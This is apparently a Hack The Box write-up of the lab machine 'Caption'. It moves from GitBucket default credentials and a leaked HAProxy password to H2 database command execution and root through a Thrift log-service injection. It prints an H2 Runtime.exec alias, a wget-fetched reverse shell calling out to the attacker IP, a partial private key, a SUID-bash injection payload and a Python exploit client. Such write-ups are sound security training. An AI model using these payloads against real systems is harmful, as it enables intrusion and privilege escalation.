---
layout: post
title: "HTB: Caption"
box: caption
img: /img/caption/caption
author: Andrew Cherney
date: 2025-01-25
tags: htb hard-box season-6 linux webapp git h2-database ssh-tunneling thrift python rce
icon: "assets/icons/caption.png"
post_description: "A fairly easy hard box using some obscure technologies. Starting off is a gitbucket service with simple credentials. As root the backend h2 database can be interacted with to create an alias which runs commands through Runtime. With that shell root can be seen running the LogService repo's server file. After generating python code with thrift and creating a client the log reading service can be fed a malicious log to achieve rce as root."
---

# Summary

{{ page.post_description }}

# Enumeration

```bash
rustscan 10.10.11.33

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.33:22
Open 10.10.11.33:80
Open 10.10.11.33:8080
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80,8080 10.10.11.33

Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-19 17:07 UTC
Initiating Ping Scan at 17:07
Scanning 10.10.11.33 [2 ports]
Completed Ping Scan at 17:07, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:07
Completed Parallel DNS resolution of 1 host. at 17:07, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:07
Scanning 10.10.11.33 [3 ports]
Discovered open port 80/tcp on 10.10.11.33
Discovered open port 22/tcp on 10.10.11.33
Discovered open port 8080/tcp on 10.10.11.33
Completed Connect Scan at 17:07, 0.07s elapsed (3 total ports)
Nmap scan report for 10.10.11.33
Host is up, received syn-ack (0.068s latency).
Scanned at 2024-09-19 17:07:48 UTC for 0s

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
8080/tcp open  http-proxy syn-ack
```

```bash
nmap -sC -p22,80,8080 10.10.11.33

Starting Nmap 7.92 ( https://nmap.org ) at 2024-09-19 12:10 CDT
Nmap scan report for 10.10.11.33
Host is up (0.064s latency).

PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http
|_http-title: Did not follow redirect to http://caption.htb
8080/tcp open  http-proxy
|_http-title: GitBucket
```

## Port 80

![caption htb login page port 80]({{ page.img }}_01_80_front_page.png)

```bash
dirsearch -u http://caption.htb

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/reports/http_caption.htb/_24-09-19_12-11-39.txt

Target: http://caption.htb/

[12:11:39] Starting: 
[12:12:28] 403 -   94B  - /download
[12:12:37] 302 -  189B  - /home  ->  /
[12:12:45] 403 -   94B  - /logs
[12:12:45] 302 -  189B  - /logout  ->  /

Task Completed
```

## Port 8080

![gitbucket front page]({{ page.img }}_02_8080_front_page.png)

Scanned for subdomains and got no hits. 

```bash
dirsearch -u http://caption.htb:8080 -x 404,400

Target: http://caption.htb:8080/

[12:46:42] Starting: 
[12:47:01] 500 -  432B  - /admin/secure/logon.jsp
[12:47:13] 200 -   62B  - /api/v3
[12:47:14] 302 -    0B  - /assets  ->  http://caption.htb:8080/assets/
[12:47:14] 403 -  370B  - /assets/
[12:47:17] 500 -  440B  - /bea_wls_internal/psquare/x.jsp
[12:47:17] 500 -  442B  - /bea_wls_internal/a2e2gp2r2/x.jsp
[12:47:23] 500 -  437B  - /console/login/LoginForm.jsp
[12:47:24] 500 -  426B  - /crx/de/index.jsp
[12:47:26] 500 -  428B  - /demo/sql/index.jsp
[12:47:30] 500 -  436B  - /examples/jsp/snp/snoop.jsp
[12:47:39] 500 -  430B  - /jsp/viewer/snoop.jsp
[12:47:39] 500 -  433B  - /jsp/extension/login.jsp
[12:47:45] 500 -  429B  - /mifs/user/login.jsp
[12:47:47] 302 -    0B  - /new  ->  http://caption.htb:8080/signin?redirect=%2Fnew
[12:47:47] 500 -  429B  - /nsw/admin/login.jsp
[12:47:49] 500 -  437B  - /pages/admin/admin-login.jsp
[12:47:57] 200 -    7KB - /root
[12:47:57] 200 -    7KB - /root/
[12:47:58] 200 -    7KB - /search
[12:48:00] 200 -    7KB - /signin
[12:48:00] 200 -    7KB - /signin/
[12:48:00] 302 -    0B  - /signout  ->  http://caption.htb:8080/
[12:48:00] 302 -    0B  - /signout/  ->  http://caption.htb:8080/
[12:48:07] 500 -  449B  - /tomcat-docs/appdev/sample/web/hello.jsp
[12:48:07] 500 -  437B  - /tmui/tmui/login/welcome.jsp
[12:48:09] 500 -  449B  - /userportal/webpages/myaccount/login.jsp
[12:48:13] 500 -  439B  - /webconsole/webpages/login.jsp
[12:48:13] 500 -  431B  - /webapp/wm/runtime.jsp
```

I fuzzed that api for different versions while I scanned what was under the version v3 to no avail.

```bash
dirsearch -u http://caption.htb:8080/api/v3 -x 404,400

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/raccoon/reports/http_caption.htb_8080/_api_v3_24-09-19_12-51-17.txt

Target: http://caption.htb:8080/

[12:51:17] Starting: api/v3/
[12:51:21] 301 -    0B  - /api/v3/.git/info/refs  ->  http://caption.htb:8080/git/api/v3/.git/info/refs
[12:52:27] 401 -   37B  - /api/v3/user/
[12:52:27] 401 -   37B  - /api/v3/user
[12:52:28] 200 -  264B  - /api/v3/users
[12:52:28] 200 -  264B  - /api/v3/users/
```

![gitbucket redirected .git]({{ page.img }}_03_8080_redirected_git.png)

An odd redirect to be sure. Without SSRF or local access to the machine I have no way to interact with this */.git* directory as when visited there is always an error.

```bash
curl http://caption.htb:8080/api/v3/users

[{"login":"root","email":"root@caption.htb","type":"User","site_admin":true,"created_at":"2024-03-08T03:01:05Z","id":0,"url":"http://caption.htb:8080/api/v3/users/root","html_url":"http://caption.htb:8080/root","avatar_url":"http://caption.htb:8080/root/_avatar"}]
```

# User as margo

## gitbucket

User root, suppose at this point I could try some default passwords given I know the username here. 

![gitbucket repos]({{ page.img }}_04_8080_repos.png)

root:root were the default credentials. A little boring but I did have to enumerate the username so I can't be that annoyed. At this gitbucket there are two repos, some log service and the login portal for the service at port 80. Sifting around in the files a couple config files can be found. 

![haproxy config]({{ page.img }}_05_8080_proxy_config.png)

![haproxy config history]({{ page.img }}_06_8080_ha_proxy_history.png)

We see here a history of this config file being edited, and seeing as this file is used for some degree of access it is possible hard coded passwords can be found. Added frontend and backend config is the commit we want to look at, because when we do it leaks the following:

![haproxy config credentials leaked previous version]({{ page.img }}_07_8080_leaked_creds.png)

## Rabbit Hole 1 - Port 80

![caption htb margo login rabbit hole]({{ page.img }}_08_80_margo_post_login.png)

When poking around the functionality of this site appears to be 0. I cannot access the logs file without some administrative permissions applied to my account (or being admin outright) and the only other page of firewalls has no functionality I can use. I could attempt to dive into ways to bypass administrative rights but for now I will look back to gitbucket as I have yet to fully explore that service.

## h2 database rce

Within the top drop down menu there is an administration tab, which contains a database viewer that can run queries on the backend database.

![gitbucket database query]({{ page.img }}_09_8080_database_query.png)

My assumption initially was this was using MySQL or something similar, so I tried to get the version and got an error I have never seen before: `org.h2.jdbc.JdbcSQLSyntaxErrorException: Function "VERSION" not found; SQL statement: select version() [90022-199]`. We now know that this database doesn't have the version function and returned a java looking error. To break down into parts, **org.h2** is effectively a reverse domain name, org typically being used for open-source project, h2 referring to the library in use here. **jdbc** is used for connections and given the following syntax error it is reasonable to assume this error means "query failed".

[https://www.h2database.com/html/functions.html?highlight=version&search=version#firstFound](https://www.h2database.com/html/functions.html?highlight=version&search=version#firstFound) contains the version function within h2. This took more time than I want to admin to find. The function in question is H2VERSION().

![h2 database version in gitbucket]({{ page.img }}_10_8080_h2version.png)

Now searching this up in exploit-db there is an exploit for RCE using java but I decided to use an older exploit since it was easier to execute. [https://www.exploit-db.com/exploits/45506](https://www.exploit-db.com/exploits/45506) goes through creating an alias which executes a supplied command using runtime. 

```java
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : "";  }$$;
```

Then I can check if the rce works by calling the new alias and supplying a command, such as id.

![gitbucket rce through h2 database]({{ page.img }}_11_8080_h2_rce_id.png)

Code execution achieved. Next I check if the commands from the database can reach a hosted server of mine.

```
CALL EXECVE('curl http://10.10.14.7:8081/h2curl')


httpserver
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.11.33 - - [19/Sep/2024 14:05:51] code 404, message File not found
10.10.11.33 - - [19/Sep/2024 14:05:51] "GET /h2curl HTTP/1.1" 404 -
```

I do some other testing to try and smuggle my own key into the .ssh directory but something wasn't working so I opted to make a shell script and run it.

```bash
shell.sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.7 7777 >/tmp/f
```

```java
CALL EXECVE('wget http://10.10.14.7:8081/shell.sh')
CALL EXECVE('bash shell.sh')
```

```bash
nc -nvlp 7777
Listening on 0.0.0.0 7777
Connection received on 10.10.11.33 55008
bash: cannot set terminal process group (1320): Inappropriate ioctl for device
bash: no job control in this shell
margo@caption:~$ id
id
uid=1000(margo) gid=1000(margo) groups=1000(margo)
margo@caption:~$ cat user.txt
cat user.txt
f12bb3cf407a--------------------
```

I'll get an ssh session for a more responsive shell.

```bash
margo@caption:~$ ls .ssh
ls .ssh
authorized_keys
id_ecdsa
id_ecdsa.pub
margo@caption:~$ cat .ssh/id_ecdsa
cat .ssh/id_ecdsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEy
LW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQTZ6f4YH+32O7yXhlrx54Inu/9KJlrbceOWisd1bhn4
nww3mmTo4qQOInYbGKZRIAo04PxtYGMBKcUtY7n7y5DaAAAAoLgGQ/e4BkP3AAAAE2VjZHNhLXNo
YTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAAB-----------------------------------------
GfifDDeaZOjipA4idhsYplEgCjTg/G1gYwE-----------------------------------------
m2a5EeFDN0A9wDhehbkAAAAAAQIDBAUGBwg=
-----END OPENSSH PRIVATE KEY-----
```

```bash
ssh -i margo_rsa margo@caption.htb
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Sep 19 09:07:25 PM UTC 2024

  System load:  0.01              Processes:             236
  Usage of /:   69.8% of 8.76GB   Users logged in:       0
  Memory usage: 33%               IPv4 address for eth0: 10.10.11.33
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Sep 10 12:33:42 2024 from 10.10.14.23
margo@caption:~$
```

# Root

## enum

```bash
margo@caption:~$ ls /home
margo  ruth
```

```bash
margo@caption:~$ find / -user ruth 2>/dev/null
/home/ruth
/var/crash/_opt_google_chrome_chrome.1001.crash
/tmp/Crashpad
/tmp/.seleniumwire
/tmp/.seleniumwire/seleniumwire-ca.pem
/tmp/.seleniumwire/seleniumwire-dhparam.pem
/proc/1318
/proc/1318/task
/proc/1318/task/1318
/proc/1318/task/1318/fd
...
```

```bash
margo@caption:~$ netstat -tunlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1324/java           
tcp        0      0 127.0.0.1:6081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3923          0.0.0.0:*               LISTEN      1328/python3        
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      1329/python3        
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

That's far more local ports than I expected. 

```bash
margo@caption:~$ curl http://127.0.0.1/9090
margo@caption:~$ curl http://127.0.0.1/6081
margo@caption:~$ curl http://127.0.0.1/6082
margo@caption:~$ curl http://127.0.0.1/3923
margo@caption:~$ curl http://127.0.0.1/8000
```

No output from any of them. At the very least 6081 and 6082 were defined in the config files to be ha proxy ports, the others however ...

From ps I find the following processes:

```bash
root        1321  0.0  0.0   2892   940 ?        Ss   16:58   0:00 /bin/sh -c cd /root;/usr/local/go/bin/go run server.go
root        1327  0.0  0.4 1240804 17700 ?       Sl   16:58   0:01 /usr/local/go/bin/go run server.go
```

## LogService

Recalling back to the gitbucket the server.go file from the LogService repo was using port 9090.

```go
1. package main

3. import (
4.     "context"
5.     "fmt"
6.     "log"
7.     "os"
8.     "bufio"
9.     "regexp"
10.     "time"
11.     "github.com/apache/thrift/lib/go/thrift"
12.     "os/exec"
13.     "log_service"
14. )

16. type LogServiceHandler struct{}

18. func (l *LogServiceHandler) ReadLogFile(ctx context.Context, filePath string) (r string, err error) {
19.     file, err := os.Open(filePath)
20.     if err != nil {
21.         return "", fmt.Errorf("error opening log file: %v", err)
22.     }
23.     defer file.Close()
24.     ipRegex := regexp.MustCompile(`\b(?:\d{1,3}\.){3}\d{1,3}\b`)
25.     userAgentRegex := regexp.MustCompile(`"user-agent":"([^"]+)"`)
26.     outputFile, err := os.Create("output.log")
27.     if err != nil {
28.         fmt.Println("Error creating output file:", err)
29.         return
30.     }
31.     defer outputFile.Close()
32.     scanner := bufio.NewScanner(file)
33.     for scanner.Scan() {
34.         line := scanner.Text()
35.         ip := ipRegex.FindString(line)
36.         userAgentMatch := userAgentRegex.FindStringSubmatch(line)
37.         var userAgent string
38.         if len(userAgentMatch) > 1 {
39.             userAgent = userAgentMatch[1]
40.         }
41.         timestamp := time.Now().Format(time.RFC3339)
42.         logs := fmt.Sprintf("echo 'IP Address: %s, User-Agent: %s, Timestamp: %s' >> output.log", ip, userAgent, timestamp)
43.         exec.Command{"/bin/sh", "-c", logs}
44.     }
45.     return "Log file processed",nil
46. }

48. func main() {
49.     handler := &LogServiceHandler{}
50.     processor := log_service.NewLogServiceProcessor(handler)
51.     transport, err := thrift.NewTServerSocket(":9090")
52.     if err != nil {
53.         log.Fatalf("Error creating transport: %v", err)
54.     }

56.     server := thrift.NewTSimpleServer4(processor, transport, thrift.NewTTransportFactory(), thrift.NewTBinaryProtocolFactoryDefault())
57.     log.Println("Starting the server...")
58.     if err := server.Serve(); err != nil {
59.         log.Fatalf("Error occurred while serving: %v", err)
60.     }
61. }
```

Investigating this file a bit more we can see that the ReadLogFile function takes a file, checks that it has the correct format, then runs an echo command to append to **output.log**, supplying the variables directly from the log file it received.

The format of the log must be `IP "user-agent":"AGENT"`, and seeing as we can see the echo command run we can throw a stray ' to escape the echo command and run our own code. By setting the user agent to `'; cp /bin/bash /tmp/bash && chmod u+s /tmp/bash #` I can create an SUID bash if my log is ever read. 

## thrift client

To interact with this thrift server I need to create a client, and that client should be able to specify what log file to parse through. Thrift is language agnostic and is used to generate and facilitate communications between different coding languages. Here thanks to the .thrift file within the LogService repo I can generate supporting python code so that I can write the client in python. 

The simple steps here to make a functioning exploit are to clone the git repo, generate the supporting python code with thrift, transfer the files to my local host, ssh tunnel port 9090, create the malicious log file, write a client in python, then run the python code for arbitrary code execution. 

Step 1: cloning the git repo

```bash
margo@caption:~$ git clone http://caption.htb:8080/root/Logservice.git
Cloning into 'Logservice'...
Username for 'http://caption.htb:8080': root
Password for 'http://root@caption.htb:8080': 
warning: redirecting to http://caption.htb:8080/git/root/Logservice.git/
remote: Counting objects: 32, done
remote: Finding sources: 100% (32/32)
remote: Getting sizes: 100% (23/23)
remote: Compressing objects: 100% (8702/8702)
Receiving objects: 100% (32/32), 8.16 KiB | 1.36 MiB/s, done.
Resolving deltas: 100% (9/9), done.
remote: Total 32 (delta 9), reused 11 (delta 0)
```

Step 2: generating supporting python code with thrift

```bash
margo@caption:~/Logservice$ thrift --gen py log_service.thrift
margo@caption:~/Logservice$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...

```

Step 3 transferring files: 

```bash
wget http://caption.htb:8081/log_service.thrift
wget -r http://caption.htb:8081/gen-py/
```

Step 4: ssh tunnel

```bash
ssh -i margo_rsa margo@caption.htb -L 9090:localhost:9090
```

Step 5: place malicious log file (I don't do this step initially I simply run the scripts and check for connectivity)

```bash
/tmp/exploit.log

127.0.0.1 "user-agent":"'; cp /bin/bash /tmp/bash && chmod u+s /tmp/bash #"
```

Step 6: make the python client script

```python
import sys
sys.path.append('gen-py')
from thrift import Thrift
from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol

# Import the generated Thrift files
from log_service import LogService

def main():
    # Server connection settings
    host = 'localhost'
    port = 9090

    # Set up the transport layer
    transport = TSocket.TSocket(host, port)
    transport = TTransport.TBufferedTransport(transport)

    # Set up the protocol layer (Binary Protocol)
    protocol = TBinaryProtocol.TBinaryProtocol(transport)

    # Create a client using the protocol and the generated LogService class
    client = LogService.Client(protocol)

    # Open the transport layer (establish the connection)
    transport.open()

    try:
        # Call the ReadLogFile method on the server
        file_path = "/tmp/exploit.log"
        log_contents = client.ReadLogFile(file_path)
        print(f"Contents of {file_path}:\n{log_contents}")
    except Thrift.TException as tx:
        print(f"Thrift error: {tx.message}")
    finally:
        # Close the connection
        transport.close()

if __name__ == "__main__":
    main()
```

I used senior dev jippity to assist me here. I import the generated files from LogService and the necessary thrift modules. I define the file for the log and then send the request to the server to use the ReadLogFile function post connection. You do need to install thrift with pip: `pip3 install thrift`.

Step 7: run the script and pray

```bash
python3 script.py 
Thrift error: Internal error processing ReadLogFile: error opening log file: open /tmp/exploit.log: no such file or directory
```

We are connecting it seems, time to create the file labelled above and run again.

```bash
margo@caption:~$ nano /tmp/exploit.log
```

```bash
python3 script.py 
Contents of /tmp/exploit.log:
Log file processed
```

Well supposedly it worked, only one way to find out though.

```bash
margo@caption:~$ ls -al /tmp/bash
-rwsr-xr-x 1 root root 1396520 Sep 19 21:58 /tmp/bash
margo@caption:~$ /tmp/bash -p
bash-5.1# id
uid=1000(margo) gid=1000(margo) euid=0(root) groups=1000(margo)
bash-5.1# cat /root/root.txt
0e813346a0b---------------------
```
